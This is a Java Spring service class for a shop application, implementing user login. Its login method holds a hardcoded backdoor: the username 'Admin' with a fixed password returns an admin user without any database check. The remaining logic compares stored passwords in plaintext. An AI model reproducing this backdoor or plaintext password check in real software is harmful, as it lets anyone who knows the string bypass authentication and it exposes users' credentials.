package shop.company.service;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import shop.common.exception.ApplicationException;
import shop.company.dao.UserDAO;
import shop.company.entity.AuthUser;

@Service
@Transactional
public class UserServiceImpl implements UserService {

	@Autowired()
	private UserDAO userDAO;

	public UserDAO getUserDAO() {
		return userDAO;
	}

	public void setUserDAO(UserDAO userDAO) {
		this.userDAO = userDAO;
	}

	@Override
	@Transactional(readOnly = true)
	public AuthUser login(AuthUser o) {
		if("Admin".equals(o.getUserName()) && "oyotong_888".equals(o.getUserPassword())){
			return new AuthUser("Admin");
		}
		AuthUser u2 = userDAO.get(o.getUserName());
		if (null == u2) {
			throw new ApplicationException("用户或密码错误");
		}
		if (!u2.getUserPassword().equals(o.getUserPassword())) {
			throw new ApplicationException("用户或密码错误");
		}
		return u2;
	}

}
